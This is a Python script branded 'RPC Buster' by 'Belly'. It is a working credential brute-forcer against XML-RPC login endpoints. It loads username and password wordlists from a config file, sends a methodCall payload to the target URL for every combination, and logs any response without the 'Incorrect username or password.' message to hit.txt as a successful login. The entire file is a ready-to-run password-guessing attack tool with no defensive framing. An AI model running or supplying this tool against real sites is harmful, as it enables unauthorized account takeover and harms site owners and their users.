from datetime import datetime
import requests
import json

banner = r"""

            ,.  ,.           ______  ______ _______    ______                               
            ||  ||          (_____ \(_____ (_______)  (____  \              _               
           ,''--''.          _____) )_____) )          ____)  )_   _  ___ _| |_ _____  ____ 
          : (.)(.) :        |  __  /|  ____/ |        |  __  (| | | |/___|_   _) ___ |/ ___)
         ,'        `.       | |  \ \| |    | |_____   | |__)  ) |_| |___ | | |_| ____| |    
         :          :       |_|   |_|_|     \______)  |______/|____/(___/   \__)_____)_|    
         :          :       By Belly
         `._m____m_,'                                                                
"""


bad_flag = "Incorrect username or password."

with open("config.json", "r") as f:
    config = json.load(f)

if config.get("wordlist_user"):
    with open(config["wordlist_user"], "rb") as f:
        users = [line.decode('utf-8', errors='ignore').strip() for line in f.readlines()]
else:
    users = [config["user"]]

if config.get("wordlist_password"):
    with open(config["wordlist_password"], "rb") as f:
        passwords = [line.decode('utf-8', errors='ignore').strip() for line in f.readlines()]
else:
    passwords = [config["password"]]
print(banner)
print("Let's start ...")
try:        
  for user in users:
      for password in passwords:
        payload = """<?xml version="1.0"?>
        <methodCall>
          <methodName>{methodName}</methodName>
          <params>
            <param>
              <value>
                <string>{user}</string>
              </value>
            </param>
            <param>
              <value>
                <string>{password}</string>
              </value>
            </param>
            <param>
              <value>
                <string></string>
              </value>
            </param>
          </params>
        </methodCall>
        """
        x = requests.post(config["url"], data=payload.format(methodName=config["methodName"], user=user, password=password), headers={"Content-Type": "text/xml"})
        if bad_flag not in x.text:
            print("{temp} [{code}] {user}:{password} {text}".format(temp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), code=x.status_code, user=user, password=password, text=x.text))
            with open("hit.txt", "a") as f:
                f.write("{temp} [{code}] {user}:{password} {text}".format(temp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), code=x.status_code, user=user, password=password, text=x.text) + "\n")
        else:
            print("{temp} [{code}] {user}:{password} Bad Credentials".format(temp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), code=x.status_code, user=user, password=password))

except KeyboardInterrupt:
    print("\nInterruption !\n")
    exit()
finally:
    print("The script has finished.")